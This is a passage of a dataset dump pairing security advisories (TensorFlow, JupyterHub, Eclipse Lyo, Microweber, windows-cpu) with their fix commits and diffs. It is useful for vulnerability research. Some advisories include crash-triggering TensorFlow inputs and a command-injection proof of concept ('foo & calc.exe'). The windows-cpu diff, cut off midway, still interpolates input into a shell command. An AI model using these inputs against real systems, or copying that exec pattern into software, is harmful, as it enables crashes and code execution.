'https:\/\/github.com\/jupyterhub\/firstuseauthenticator\/pull\/38\/commits\/32b21898fb2b53b1a2e36270de6854ad70e9e9bf'}","dataset":"osv","summary":"Improper Access Control in jupyterhub-firstuseauthenticator ### Impact\n\nWhen JupyterHub is used with FirstUseAuthenticator, the vulnerability allows unauthorized access to any user's account if `create_users=True` and the username is known or guessed.\n\n### Patches\n\nUpgrade to jupyterhub-firstuseauthenticator to 1.0, or apply patch https:\/\/github.com\/jupyterhub\/firstuseauthenticator\/pull\/38.patch\n\n### Workarounds\n\nIf you cannot upgrade, there is no complete workaround, but it can be mitigated.\n\nIf you cannot upgrade yet, you can disable user creation with `c.FirstUseAuthenticator.create_users = False`, which will only allow login with fully normalized usernames for already existing users prior to jupyterhub-firstuserauthenticator 1.0. If any users have never logged in with their normalized username (i.e. lowercase), they will still be vulnerable until you can patch or upgrade.","published_date":"2021-10-28","chain_len":2,"project":"https:\/\/github.com\/jupyterhub\/firstuseauthenticator","commit_href":"https:\/\/github.com\/jupyterhub\/firstuseauthenticator\/pull\/38\/commits\/32b21898fb2b53b1a2e36270de6854ad70e9e9bf","commit_sha":"32b21898fb2b53b1a2e36270de6854ad70e9e9bf","patch":"MULTI","chain_ord":"['32b21898fb2b53b1a2e36270de6854ad70e9e9bf', '9e200d974e0cb85d828a6afedb8ab90a37878f28']","before_first_fix_commit":"{'32b21898fb2b53b1a2e36270de6854ad70e9e9bf'}","last_fix_commit":"9e200d974e0cb85d828a6afedb8ab90a37878f28","chain_ord_pos":1.0,"commit_datetime":"09\/02\/2021, 20:23:22","message":"lowercase username to lock password","author":"George Hunt","comments":null,"stats":"{'additions': 1, 'deletions': 1, 'total': 2}","files":"{'firstuseauthenticator\/firstuseauthenticator.py': {'additions': 1, 'deletions': 1, 'changes': 2, 'status': 'modified', 'raw_url': 'https:\/\/github.com\/jupyterhub\/firstuseauthenticator\/raw\/32b21898fb2b53b1a2e36270de6854ad70e9e9bf\/firstuseauthenticator%2Ffirstuseauthenticator.py', 'patch': \"@@ -138,7 +138,7 @@ def validate_username(self, name):\\n \\n     @gen.coroutine\\n     def authenticate(self, handler, data):\\n-        username = data['username']\\n+        username = data['username'].lower()\\n \\n         if not self.create_users:\\n             if not self._user_exists(username):\"}}","message_norm":"lowercase username to lock password","language":"en","entities":"[('password', 'SECWORD', '')]","classification_level_1":null,"classification_level_2":null,"list_files":"dict_keys(['firstuseauthenticator\/firstuseauthenticator.py'])","num_files":1.0},{"index":725,"vuln_id":"GHSA-5xwc-mrhx-5g3m","cwe_id":"{'CWE-824'}","score":7.1,"chain":"{'https:\/\/github.com\/tensorflow\/tensorflow\/commit\/f2a673bd34f0d64b8e40a551ac78989d16daad09'}","dataset":"osv","summary":"Reference binding to nullptr in `MatrixDiagV*` ops ### Impact\nAn attacker can cause undefined behavior via binding a reference to null pointer in all operations of type `tf.raw_ops.MatrixDiagV*`:\n\n```python\nimport tensorflow as tf\n\ntf.raw_ops.MatrixDiagV3(\n  diagonal=[1,0],\n  k=[],\n  num_rows=[1,2,3],\n  num_cols=[4,5],\n  padding_value=[],\n  align='RIGHT_RIGHT')\n``` \n\nThe [implementation](https:\/\/github.com\/tensorflow\/tensorflow\/blob\/84d053187cb80d975ef2b9684d4b61981bca0c41\/tensorflow\/core\/kernels\/linalg\/matrix_diag_op.cc) has incomplete validation that the value of `k` is a valid tensor. We have check that this value is either a scalar or a vector, but there is no check for the number of elements. If this is an empty tensor, then code that accesses the first element of the tensor is wrong:\n\n```cc\n  auto& diag_index = context->input(1);\n  ...\n  lower_diag_index = diag_index.flat<int32>()(0);\n```\n\n### Patches\nWe have patched the issue in GitHub commit [f2a673bd34f0d64b8e40a551ac78989d16daad09](https:\/\/github.com\/tensorflow\/tensorflow\/commit\/f2a673bd34f0d64b8e40a551ac78989d16daad09).\n\nThe fix will be included in TensorFlow 2.6.0. We will also cherrypick this commit on TensorFlow 2.5.1, TensorFlow 2.4.3, and TensorFlow 2.3.4, as these are also affected and still in supported range.\n\n### For more information\nPlease consult [our security guide](https:\/\/github.com\/tensorflow\/tensorflow\/blob\/master\/SECURITY.md) for more information regarding the security model and how to contact us with issues and questions.\n\n### Attribution\nThis vulnerability has been reported by members of the Aivul Team from Qihoo 360.","published_date":"2021-08-25","chain_len":1,"project":"https:\/\/github.com\/tensorflow\/tensorflow","commit_href":"https:\/\/github.com\/tensorflow\/tensorflow\/commit\/f2a673bd34f0d64b8e40a551ac78989d16daad09","commit_sha":"f2a673bd34f0d64b8e40a551ac78989d16daad09","patch":"SINGLE","chain_ord":"['f2a673bd34f0d64b8e40a551ac78989d16daad09']","before_first_fix_commit":"{'ff8894044dfae5568ecbf2ed514c1a37dc394f1b'}","last_fix_commit":"f2a673bd34f0d64b8e40a551ac78989d16daad09","chain_ord_pos":1.0,"commit_datetime":"07\/31\/2021, 02:00:00","message":"Add missing validation to `matrix_diag_op.cc`\n\nPiperOrigin-RevId: 387923533\nChange-Id: Idfffeb328d5f9c6748d992d28a56d6e9e45103a0","author":"Mihai Maruseac","comments":null,"stats":"{'additions': 6, 'deletions': 0, 'total': 6}","files":"{'tensorflow\/core\/kernels\/linalg\/matrix_diag_op.cc': {'additions': 6, 'deletions': 0, 'changes': 6, 'status': 'modified', 'raw_url': 'https:\/\/github.com\/tensorflow\/tensorflow\/raw\/f2a673bd34f0d64b8e40a551ac78989d16daad09\/tensorflow%2Fcore%2Fkernels%2Flinalg%2Fmatrix_diag_op.cc', 'patch': '@@ -73,6 +73,9 @@ class MatrixDiagPartOp : public OpKernel {\\n                   errors::InvalidArgument(\\n                       \"diag_index must be a scalar or vector, received shape: \",\\n                       diag_index.shape().DebugString()));\\n+      OP_REQUIRES(context, diag_index.NumElements() > 0,\\n+                  errors::InvalidArgument(\\n+                      \"Expected diag_index to have at least 1 element\"));\\n       lower_diag_index = diag_index.flat<int32>()(0);\\n       upper_diag_index = lower_diag_index;\\n       if (TensorShapeUtils::IsVector(diag_index.shape())) {\\n@@ -179,6 +182,9 @@ class MatrixDiagOp : public OpKernel {\\n                   errors::InvalidArgument(\\n                       \"diag_index must be a scalar or vector, received shape: \",\\n                       diag_index.shape().DebugString()));\\n+      OP_REQUIRES(context, diag_index.NumElements() > 0,\\n+                  errors::InvalidArgument(\\n+                      \"Expected diag_index to have at least 1 element\"));\\n       lower_diag_index = diag_index.flat<int32>()(0);\\n       upper_diag_index = lower_diag_index;\\n       if (TensorShapeUtils::IsVector(diag_index.shape())) {'}}","message_norm":"add missing validation to `matrix_diag_op.cc`\n\npiperorigin-revid: 387923533\nchange-id: idfffeb328d5f9c6748d992d28a56d6e9e45103a0","language":"en","entities":"[('add', 'ACTION', ''), ('missing validation', 'SECWORD', ''), ('387923533', 'SHA', 'generic_sha')]","classification_level_1":null,"classification_level_2":null,"list_files":"dict_keys(['tensorflow\/core\/kernels\/linalg\/matrix_diag_op.cc'])","num_files":1.0},{"index":727,"vuln_id":"GHSA-627q-g293-49q7","cwe_id":"{'CWE-400'}","score":6.5,"chain":"{'https:\/\/github.com\/tensorflow\/tensorflow\/commit\/1361fb7e29449629e1df94d44e0427ebec8c83c7'}","dataset":"osv","summary":"Abort caused by allocating a vector that is too large in Tensorflow ### Impact\nDuring shape inference, TensorFlow can [allocate a large vector](https:\/\/github.com\/tensorflow\/tensorflow\/blob\/a1320ec1eac186da1d03f033109191f715b2b130\/tensorflow\/core\/framework\/shape_inference.cc#L788-L790) based on a value from a tensor controlled by the user:\n\n```cc\n  const auto num_dims = Value(shape_dim);\n  std::vector<DimensionHandle> dims;\n  dims.reserve(num_dims);\n``` \n  \n### Patches           \nWe have patched the issue in GitHub commit [1361fb7e29449629e1df94d44e0427ebec8c83c7](https:\/\/github.com\/tensorflow\/tensorflow\/commit\/1361fb7e29449629e1df94d44e0427ebec8c83c7).\n\nThe fix will be included in TensorFlow 2.8.0. We will also cherrypick this commit on TensorFlow 2.7.1, TensorFlow 2.6.3, and TensorFlow 2.5.3, as these are also affected and still in supported range.\n\n### For more information\nPlease consult [our security guide](https:\/\/github.com\/tensorflow\/tensorflow\/blob\/master\/SECURITY.md) for more information regarding the security model and how to contact us with issues and questions.","published_date":"2022-02-07","chain_len":1,"project":"https:\/\/github.com\/tensorflow\/tensorflow","commit_href":"https:\/\/github.com\/tensorflow\/tensorflow\/commit\/1361fb7e29449629e1df94d44e0427ebec8c83c7","commit_sha":"1361fb7e29449629e1df94d44e0427ebec8c83c7","patch":"SINGLE","chain_ord":"['1361fb7e29449629e1df94d44e0427ebec8c83c7']","before_first_fix_commit":"{'f6e7c84316c9fe416ea32086fa3c64fee21fafab'}","last_fix_commit":"1361fb7e29449629e1df94d44e0427ebec8c83c7","chain_ord_pos":1.0,"commit_datetime":"11\/10\/2021, 23:52:57","message":"Fix abort caused by allocating a too large vector.\n\nWe need to make sure that the number of dimensions in a shape is within limits.\n\nPiperOrigin-RevId: 408997911\nChange-Id: If59e1c23f2ec9c2d4ff4d8632fd62b2a7773a4eb","author":"Mihai Maruseac","comments":null,"stats":"{'additions': 15, 'deletions': 0, 'total': 15}","files":"{'tensorflow\/core\/framework\/shape_inference.cc': {'additions': 15, 'deletions': 0, 'changes': 15, 'status': 'modified', 'raw_url': 'https:\/\/github.com\/tensorflow\/tensorflow\/raw\/1361fb7e29449629e1df94d44e0427ebec8c83c7\/tensorflow%2Fcore%2Fframework%2Fshape_inference.cc', 'patch': '@@ -14,6 +14,8 @@ limitations under the License.\\n ==============================================================================*\/\\n #include \"tensorflow\/core\/framework\/shape_inference.h\"\\n \\n+#include <cstdint>\\n+\\n #include \"tensorflow\/core\/framework\/bounds_check.h\"\\n #include \"tensorflow\/core\/framework\/full_type_util.h\"\\n #include \"tensorflow\/core\/framework\/node_def.pb.h\"\\n@@ -789,6 +791,19 @@ Status InferenceContext::InternalMakeShapeFromTensor(\\n       return ReturnUnknownShape(out);\\n     }\\n     const auto num_dims = Value(shape_dim);\\n+    \/\/ TODO(mihaimaruseac): Should be `TensorShape::MaxDimensions()` as we are\\n+    \/\/ not able to materialize shapes with more than this number of dimensions\\n+    \/\/ but then shape inference would fail for operations such as\\n+    \/\/ `tf.range`\/`tf.ones`, etc. where the shape is not really materialized,\\n+    \/\/ only used during the inference. Hence, just prevent doing a `reserve`\\n+    \/\/ with a very large argument.\\n+    const int64_t max_dimensions = 1 << 20;\\n+    if (num_dims >= max_dimensions) {\\n+      return errors::Internal(\\n+          \"Cannot create a tensor with \", num_dims,\\n+          \" dimensions, as these would be more than maximum of \",\\n+          max_dimensions);\\n+    }\\n     std::vector<DimensionHandle> dims;\\n     dims.reserve(num_dims);\\n     for (int i = 0; i < num_dims; i++) dims.push_back(UnknownDim());'}}","message_norm":"fix abort caused by allocating a too large vector.\n\nwe need to make sure that the number of dimensions in a shape is within limits.\n\npiperorigin-revid: 408997911\nchange-id: if59e1c23f2ec9c2d4ff4d8632fd62b2a7773a4eb","language":"en","entities":"[('fix', 'ACTION', ''), ('408997911', 'SHA', 'generic_sha')]","classification_level_1":null,"classification_level_2":null,"list_files":"dict_keys(['tensorflow\/core\/framework\/shape_inference.cc'])","num_files":1.0},{"index":729,"vuln_id":"GHSA-6296-mvgp-27hp","cwe_id":"{'CWE-611'}","score":4.2,"chain":"{'https:\/\/github.com\/eclipse\/lyo\/commit\/a8b15b7f49ca15e55f6699749c39705d21367c6e'}","dataset":"osv","summary":"XML External Entity Reference in Eclipse Lyo In Eclipse Lyo versions 1.0.0 to 4.1.0, a TransformerFactory is initialized with the defaults that do not restrict DTD loading when working with RDF\/XML. This allows an attacker to cause an external DTD to be retrieved.","published_date":"2022-07-08","chain_len":1,"project":"https:\/\/github.com\/eclipse\/lyo","commit_href":"https:\/\/github.com\/eclipse\/lyo\/commit\/a8b15b7f49ca15e55f6699749c39705d21367c6e","commit_sha":"a8b15b7f49ca15e55f6699749c39705d21367c6e","patch":"SINGLE","chain_ord":"['a8b15b7f49ca15e55f6699749c39705d21367c6e']","before_first_fix_commit":"{'5c07867c6fb4076f0177a28abc48cb83598197de'}","last_fix_commit":"a8b15b7f49ca15e55f6699749c39705d21367c6e","chain_ord_pos":1.0,"commit_datetime":"05\/06\/2022, 12:03:44","message":"Improve Transformer init\n\nSigned-off-by: Andrew Berezovskyi <andriib@kth.se>","author":"Andrew Berezovskyi","comments":null,"stats":"{'additions': 10, 'deletions': 14, 'total': 24}","files":"{'core\/oslc4j-jena-provider\/src\/main\/java\/org\/eclipse\/lyo\/oslc4j\/provider\/jena\/JenaModelHelper.java': {'additions': 10, 'deletions': 14, 'changes': 24, 'status': 'modified', 'raw_url': 'https:\/\/github.com\/eclipse\/lyo\/raw\/a8b15b7f49ca15e55f6699749c39705d21367c6e\/core%2Foslc4j-jena-provider%2Fsrc%2Fmain%2Fjava%2Forg%2Feclipse%2Flyo%2Foslc4j%2Fprovider%2Fjena%2FJenaModelHelper.java', 'patch': '@@ -52,6 +52,7 @@\\n import org.slf4j.LoggerFactory;\\n import org.w3c.dom.Element;\\n \\n+import javax.xml.XMLConstants;\\n import javax.xml.datatype.DatatypeConfigurationException;\\n import javax.xml.datatype.DatatypeFactory;\\n import javax.xml.namespace.QName;\\n@@ -119,7 +120,7 @@ static Model createJenaModel(final String descriptionAbout, final String respons\\n             final ResponseInfo<?> responseInfo, final Object[] objects, final Map<String, Object> properties)\\n             throws DatatypeConfigurationException, IllegalAccessException, IllegalArgumentException,\\n             InvocationTargetException, OslcCoreApplicationException {\\n-        \\n+\\n         Instant start = Instant.now();\\n \\n         final Model model = ModelFactory.createDefaultModel();\\n@@ -402,7 +403,7 @@ public static Object[] fromJenaModel(final Model model, final Class<?> beanClass\\n             IllegalArgumentException,\\n             InstantiationException, InvocationTargetException, OslcCoreApplicationException,\\n             URISyntaxException, SecurityException, NoSuchMethodException {\\n-        \\n+\\n         Instant start = Instant.now();\\n \\n         final List<Object> results = new ArrayList<>();\\n@@ -664,10 +665,7 @@ else if (!(bean instanceof AbstractResource))\\n                 {\\n                     if (extendedProperties == null)\\n                     {\\n-                        logger.debug(\"Set method not found for object type:\\t\" +\\n-                                beanClass.getName() +\\n-                                \", uri:\\t\" +\\n-                                uri);\\n+                        logger.debug(\"Set method not found for object type: {}, uri: {}\", beanClass.getName(), uri);\\n                     }\\n                     else\\n                     {\\n@@ -2270,20 +2268,18 @@ private static String getVisitedResourceName(Resource resource)\\n         return visitedResourceName;\\n     }\\n \\n-    private static Transformer createTransformer()\\n-    {\\n-        try\\n-        {\\n-            Transformer transformer = TransformerFactory.newInstance().newTransformer();\\n+    private static Transformer createTransformer() {\\n+        try {\\n+            TransformerFactory factory = TransformerFactory.newInstance();\\n+            factory.setAttribute(XMLConstants.ACCESS_EXTERNAL_DTD, \"\");\\n+            factory.setAttribute(XMLConstants.ACCESS_EXTERNAL_STYLESHEET, \"\");\\n \\n+            Transformer transformer = factory.newTransformer();\\n             transformer.setOutputProperty(OutputKeys.OMIT_XML_DECLARATION, \"yes\");\\n \\n             return transformer;\\n-\\n         } catch (TransformerException e) {\\n-\\n             throw new RuntimeException(e);\\n-\\n         }\\n     }'}}","message_norm":"improve transformer init\n\nsigned-off-by: andrew berezovskyi <andriib@kth.se>","language":"en","entities":"[('improve', 'ACTION', ''), ('andriib@kth.se', 'EMAIL', '')]","classification_level_1":null,"classification_level_2":null,"list_files":"dict_keys(['core\/oslc4j-jena-provider\/src\/main\/java\/org\/eclipse\/lyo\/oslc4j\/provider\/jena\/JenaModelHelper.java'])","num_files":1.0},{"index":732,"vuln_id":"GHSA-62gx-355r-9fhg","cwe_id":"{'CWE-476'}","score":2.5,"chain":"{'https:\/\/github.com\/tensorflow\/tensorflow\/commit\/ff70c47a396ef1e3cb73c90513da4f5cb71bebba'}","dataset":"osv","summary":"Session operations in eager mode lead to null pointer dereferences ### Impact\nIn eager mode (default in TF 2.0 and later), session operations are invalid. However, users could still call the raw ops associated with them and trigger a null pointer dereference:\n\n```python\nimport tensorflow as tf\ntf.raw_ops.GetSessionTensor(handle=['\\x12\\x1a\\x07'],dtype=4)\n```\n```python\nimport tensorflow as tf\ntf.raw_ops.DeleteSessionTensor(handle=['\\x12\\x1a\\x07'])\n``` \n\nThe [implementation](https:\/\/github.com\/tensorflow\/tensorflow\/blob\/eebb96c2830d48597d055d247c0e9aebaea94cd5\/tensorflow\/core\/kernels\/session_ops.cc#L104) dereferences the session state pointer without checking if it is valid:\n  \n```cc\n  OP_REQUIRES_OK(ctx, ctx->session_state()->GetTensor(name, &val));\n```\n\nThus, in eager mode, `ctx->session_state()` is nullptr and the call of the member function is undefined behavior.\n\n### Patches\nWe have patched the issue in GitHub commit [ff70c47a396ef1e3cb73c90513da4f5cb71bebba](https:\/\/github.com\/tensorflow\/tensorflow\/commit\/ff70c47a396ef1e3cb73c90513da4f5cb71bebba).\n\nThe fix will be included in TensorFlow 2.5.0. We will also cherrypick this commit on TensorFlow 2.4.2, TensorFlow 2.3.3, TensorFlow 2.2.3 and TensorFlow 2.1.4, as these are also affected and still in supported range.\n\n### For more information\nPlease consult [our security guide](https:\/\/github.com\/tensorflow\/tensorflow\/blob\/master\/SECURITY.md) for more information regarding the security model and how to contact us with issues and questions.\n\n### Attribution\nThis vulnerability has been reported by members of the Aivul Team from Qihoo 360.","published_date":"2021-05-21","chain_len":1,"project":"https:\/\/github.com\/tensorflow\/tensorflow","commit_href":"https:\/\/github.com\/tensorflow\/tensorflow\/commit\/ff70c47a396ef1e3cb73c90513da4f5cb71bebba","commit_sha":"ff70c47a396ef1e3cb73c90513da4f5cb71bebba","patch":"SINGLE","chain_ord":"['ff70c47a396ef1e3cb73c90513da4f5cb71bebba']","before_first_fix_commit":"{'eebb96c2830d48597d055d247c0e9aebaea94cd5'}","last_fix_commit":"ff70c47a396ef1e3cb73c90513da4f5cb71bebba","chain_ord_pos":1.0,"commit_datetime":"04\/13\/2021, 21:24:00","message":"Fix `tf.raw_ops.GetSessionTensor` and `tf.raw_ops.DeleteSessionTensor` null pointer dereferences.\n\nPiperOrigin-RevId: 368294154\nChange-Id: Ie10f07a0a9a1c2b685e08153d48a0ca4b93f9fc9","author":"Amit Patankar","comments":null,"stats":"{'additions': 10, 'deletions': 4, 'total': 14}","files":"{'tensorflow\/core\/kernels\/session_ops.cc': {'additions': 10, 'deletions': 4, 'changes': 14, 'status': 'modified', 'raw_url': 'https:\/\/github.com\/tensorflow\/tensorflow\/raw\/ff70c47a396ef1e3cb73c90513da4f5cb71bebba\/tensorflow%2Fcore%2Fkernels%2Fsession_ops.cc', 'patch': '@@ -91,7 +91,6 @@ TF_CALL_NUMBER_TYPES(REGISTER_GPU_KERNEL);\\n REGISTER_GPU_KERNEL(bool);\\n #undef REGISTER_GPU_KERNEL\\n \\n-\\n class GetSessionTensorOp : public OpKernel {\\n  public:\\n   explicit GetSessionTensorOp(OpKernelConstruction* context)\\n@@ -101,7 +100,11 @@ class GetSessionTensorOp : public OpKernel {\\n     const Tensor& handle = ctx->input(0);\\n     const string& name = handle.scalar<tstring>()();\\n     Tensor val;\\n-    OP_REQUIRES_OK(ctx, ctx->session_state()->GetTensor(name, &val));\\n+    auto session_state = ctx->session_state();\\n+    OP_REQUIRES(ctx, session_state != nullptr,\\n+                errors::FailedPrecondition(\\n+                    \"GetSessionTensor called on null session state\"));\\n+    OP_REQUIRES_OK(ctx, session_state->GetTensor(name, &val));\\n     ctx->set_output(0, val);\\n   }\\n \\n@@ -122,7 +125,6 @@ TF_CALL_NUMBER_TYPES(REGISTER_GPU_KERNEL);\\n REGISTER_GPU_KERNEL(bool);\\n #undef REGISTER_GPU_KERNEL\\n \\n-\\n class DeleteSessionTensorOp : public OpKernel {\\n  public:\\n   explicit DeleteSessionTensorOp(OpKernelConstruction* context)\\n@@ -131,7 +133,11 @@ class DeleteSessionTensorOp : public OpKernel {\\n   void Compute(OpKernelContext* ctx) override {\\n     const Tensor& handle = ctx->input(0);\\n     const string& name = handle.scalar<tstring>()();\\n-    OP_REQUIRES_OK(ctx, ctx->session_state()->DeleteTensor(name));\\n+    auto session_state = ctx->session_state();\\n+    OP_REQUIRES(ctx, session_state != nullptr,\\n+                errors::FailedPrecondition(\\n+                    \"DeleteSessionTensor called on null session state\"));\\n+    OP_REQUIRES_OK(ctx, session_state->DeleteTensor(name));\\n   }\\n \\n   TF_DISALLOW_COPY_AND_ASSIGN(DeleteSessionTensorOp);'}}","message_norm":"fix `tf.raw_ops.getsessiontensor` and `tf.raw_ops.deletesessiontensor` null pointer dereferences.\n\npiperorigin-revid: 368294154\nchange-id: ie10f07a0a9a1c2b685e08153d48a0ca4b93f9fc9","language":"en","entities":"[('fix', 'ACTION', ''), ('null pointer dereferences', 'SECWORD', ''), ('368294154', 'SHA', 'generic_sha')]","classification_level_1":null,"classification_level_2":null,"list_files":"dict_keys(['tensorflow\/core\/kernels\/session_ops.cc'])","num_files":1.0},{"index":733,"vuln_id":"GHSA-6346-5r4h-ff5x","cwe_id":"{'CWE-79'}","score":6.1,"chain":"{'https:\/\/github.com\/microweber\/microweber\/commit\/724e2d186a33c0c27273107dc4f160a09384877f'}","dataset":"osv","summary":"Microweber vulnerable to cross-site scripting (XSS) Microweber is a drag and drop website builder and a powerful next generation CMS. Microweber versions 1.2.15 and prior are vulnerable to cross-site scripting. This could lead to injection of arbitrary JaveScript code, defacement of a page, or stealing cookies. A patch is available on the `master` branch of Microweber's GitHub repository.","published_date":"2022-05-05","chain_len":1,"project":"https:\/\/github.com\/microweber\/microweber","commit_href":"https:\/\/github.com\/microweber\/microweber\/commit\/724e2d186a33c0c27273107dc4f160a09384877f","commit_sha":"724e2d186a33c0c27273107dc4f160a09384877f","patch":"SINGLE","chain_ord":"['724e2d186a33c0c27273107dc4f160a09384877f']","before_first_fix_commit":"{'5eb846301d61b22eda84a997026d050a14a518f4'}","last_fix_commit":"724e2d186a33c0c27273107dc4f160a09384877f","chain_ord_pos":1.0,"commit_datetime":"05\/03\/2022, 08:41:32","message":"Update order_filtering.blade.php","author":"Bozhidar Slaveykov","comments":null,"stats":"{'additions': 1, 'deletions': 1, 'total': 2}","files":"{'src\/MicroweberPackages\/Order\/resources\/views\/admin\/orders\/partials\/order_filtering.blade.php': {'additions': 1, 'deletions': 1, 'changes': 2, 'status': 'modified', 'raw_url': 'https:\/\/github.com\/microweber\/microweber\/raw\/724e2d186a33c0c27273107dc4f160a09384877f\/src%2FMicroweberPackages%2FOrder%2Fresources%2Fviews%2Fadmin%2Forders%2Fpartials%2Forder_filtering.blade.php', 'patch': '@@ -158,7 +158,7 @@ class=\"btn btn-link btn-sm <?php if (isset($abandoned)): ?>font-weight-bold text\\n             $(document).ready(function () {\\n                 var searchOrdersByProduct = new mw.autoComplete({\\n                     element: \"#js-orders-search-by-products\",\\n-                    placeholder: \"<?php if ($productKeyword) { echo $productKeyword; } else { _e(\"Search by products...\"); }?>\",\\n+                    placeholder: \"<?php if ($productKeyword) { echo xss_clean($productKeyword); } else { _e(\"Search by products...\"); }?>\",\\n                     autoComplete:true,\\n                     ajaxConfig: {\\n                         method: \\'get\\','}}","message_norm":"update order_filtering.blade.php","language":"da","entities":"[('update', 'ACTION', '')]","classification_level_1":null,"classification_level_2":null,"list_files":"dict_keys(['src\/MicroweberPackages\/Order\/resources\/views\/admin\/orders\/partials\/order_filtering.blade.php'])","num_files":1.0},{"index":738,"vuln_id":"GHSA-63m4-fhf2-cmf7","cwe_id":"{'CWE-78'}","score":9.8,"chain":"{'https:\/\/github.com\/KyleRoss\/windows-cpu\/commit\/b75e19aa2f7459a9506bceb577ba2341fe273117'}","dataset":"osv","summary":"Command Execution in windows-cpu Version of `windows-cpu` before 0.1.5 will execute arbitrary code passed into the first argument of the `findLoad` method, resulting in remote code execution.\n\n## Proof of Concept\n\n```\nvar win = require('windows-cpu');\nwind.findLoad('foo & calc.exe');\n```\n\n\n## Recommendation\n\nUpdate to version 0.1.5 or later.","published_date":"2020-09-01","chain_len":1,"project":"https:\/\/github.com\/KyleRoss\/windows-cpu","commit_href":"https:\/\/github.com\/KyleRoss\/windows-cpu\/commit\/b75e19aa2f7459a9506bceb577ba2341fe273117","commit_sha":"b75e19aa2f7459a9506bceb577ba2341fe273117","patch":"SINGLE","chain_ord":"['b75e19aa2f7459a9506bceb577ba2341fe273117']","before_first_fix_commit":"{'da656c1a9d5edbf4e8bf0640f349aeb714a4f1a0'}","last_fix_commit":"b75e19aa2f7459a9506bceb577ba2341fe273117","chain_ord_pos":1.0,"commit_datetime":"04\/13\/2017, 04:32:09","message":"ES6 Refactor + fix vulnerability","author":"Kyle Ross","comments":null,"stats":"{'additions': 120, 'deletions': 143, 'total': 263}","files":"{'index.js': {'additions': 120, 'deletions': 143, 'changes': 263, 'status': 'modified', 'raw_url': 'https:\/\/github.com\/KyleRoss\/windows-cpu\/raw\/b75e19aa2f7459a9506bceb577ba2341fe273117\/index.js', 'patch': '@@ -1,120 +1,92 @@\\n \/**\\n  * windows-cpu module for Node.js to get various load statistics.\\n  * @module windows-cpu\\n- * @version 0.1.4\\n- * @author Kyle Ross <kylerross1324@gmail.com>\\n+ * @version 1.0.0\\n+ * @author Kyle Ross\\n  * @license MIT License\\n- * \\n- * @requires os\\n- * @requires child_process\\n- *\\n- * @example\\n- *\\n- * var cpu = require(\\'windows-cpu\\');\\n  *\/\\n+\"use strict\";\\n \\n-(function() {\\n-    var platform = require(\\'os\\').platform(),\\n-        path     = require(\\'path\\'),\\n-        exec     = require(\\'child_process\\').exec,\\n-        execFile = require(\\'child_process\\').execFile,\\n-        wmic     = platform === \\'win32\\'? path.join(process.env.SystemRoot, \\'System32\\', \\'wbem\\', \\'wmic.exe\\') : null,\\n-        emptyFn  = function(){},\\n-        findLoad;\\n-    \\n-    \/*\\n-     * Checks current platform to ensure we are running on `win32`.\\n-     * @private\\n-     * @param {function} cb A callback function to call if there is an error.\\n-     * @returns {boolean} True if `win32` platform, else false.\\n-     *\/\\n-    function checkPlatform(cb) {\\n-        if(platform !== \\'win32\\') {\\n-            if(isFunction(cb)) cb(new Error(\\'windows-cpu> [ERROR] This module only works on Windows platforms.\\'));\\n-            return false;\\n-        }\\n-        return true;\\n-    }\\n+const fs = require(\\'fs\\');\\n+const path = require(\\'path\\');\\n+const cp = require(\\'child_process\\');\\n+const platform = require(\\'os\\').platform();\\n+\\n+const exec = cp.exec;\\n+const execFile = cp.execFile;\\n+const wmic = path.join(process.env.SystemRoot, \\'System32\\', \\'wbem\\', \\'wmic.exe\\');\\n+\\n+\/**\\n+ * Finds the current processor load of a specific process name or id.\\n+ * @private\\n+ * @param  {String}   arg Process name or id to lookup\\n+ * @param  {Function} cb  Callback to call with results\\n+ *\/\\n+function findLoad(arg, cb) {\\n+    let cmd = `wmic path Win32_PerfFormattedData_PerfProc_Process get Name,PercentProcessorTime,IDProcess | findstr \/i \/c:${arg}`;\\n     \\n-    \/*\\n-     * Proper checking to see if variable is a function.\\n-     * @private\\n-     * @param {*} fn The variable to check if is a function.\\n-     * @returns {boolean} True if is a function, else false.\\n-     *\/\\n-    function isFunction(fn) {\\n-        var getType = {};\\n-        return fn && getType.toString.call(fn) === \\'[object Function]\\';\\n+    exec(cmd, function(error, res, stderr) {\\n+        if(error !== null || stderr) return cb(error || stderr);\\n+        if(!res) return cb(`Cannot find results for provided arg: ${arg}`, { load: 0, results: [] });\\n+        \\n+        let found = res.replace(\/[^\\\\S\\\\n]+\/g, \\':\\').replace(\/:\\\\s\/g, \\'|\\').split(\\'|\\').filter(function(v) {\\n+            return !!v;\\n+        }).map(function(v) {\\n+            let [pid, proc, load] = v.split(\\':\\');\\n+            return {\\n+                pid: +pid,\\n+                process: proc,\\n+                load: +load\\n+            };\\n+        });\\n+        \\n+        let load = found.reduce((acc, val) => {\\n+            return acc + val.load;\\n+        }, 0);\\n+        \\n+        cb(null, { load, found });\\n+    });\\n+}\\n+\\n+\/**\\n+ * @class Public class for WindowsCPU\\n+ *\/\\n+class WindowsCPU {\\n+    constructor() {\\n+        \/**\\n+         * Access to uninstantiated WindowsCPU class\\n+         * @type {Class}\\n+         *\/\\n+        this.WindowsCPU = WindowsCPU;\\n+        this.checkPlatform();\\n     }\\n     \\n     \/**\\n-     * Gets the total load in percent for process(es) by a specific search parameter.\\n-     * @param {string|number} arg Specific search parameter. Can be a Process ID or Process Name.\\n-     * @param {function} cb A callback function to handle the results (error, results).\\n-     * @example\\n-     *\\n-     * var cpu = require(\\'windows-cpu\\');\\n-     *\\n-     * \/\/ Find the total load for \"chrome\" processes\\n-     * cpu.findLoad(\\'chrome\\', function(error, results) {\\n-     *      if(error) {\\n-     *          return console.log(error);\\n-     *      }\\n-     *\\n-     *      \/\/ results =>\\n-     *      \/\/ {\\n-     *      \/\/    load: 8,\\n-     *      \/\/    found: [\\n-     *      \/\/        { pid: \\'900\\', process: \\'chrome\\', load: 4 },\\n-     *      \/\/        { pid: \\'905\\', process: \\'chrome#1\\', load: 0 },\\n-     *      \/\/        { pid: \\'910\\', process: \\'chrome#2\\', load: 4 }\\n-     *      \/\/    ]\\n-     *      \/\/ }\\n-     *\\n-     *      console.log(\\'Google Chrome is currently using \\' + results.load + \\'% of the cpu.\\');\\n-     * });\\n+     * Checks if the current platform is supported by windows-cpu\\n+     * @return {Boolean} Returns `true` if platform is supported\\n+     * @throws {Error} If platform is not Windows\\n+     * @throws {Error} If wmic.exe process does not exist or cannot be accessed\\n      *\/\\n-    findLoad = exports.findLoad = function findLoad(arg, cb) {\\n-        if(!isFunction(cb)) cb = emptyFn;\\n-        if(!checkPlatform(cb)) return;\\n+    checkPlatform() {\\n+        if(platform !== \\'win32\\') \\n+            throw new Error(\\'windows-cpu only works on Windows platforms.\\');\\n         \\n-        var cmd = \"wmic path 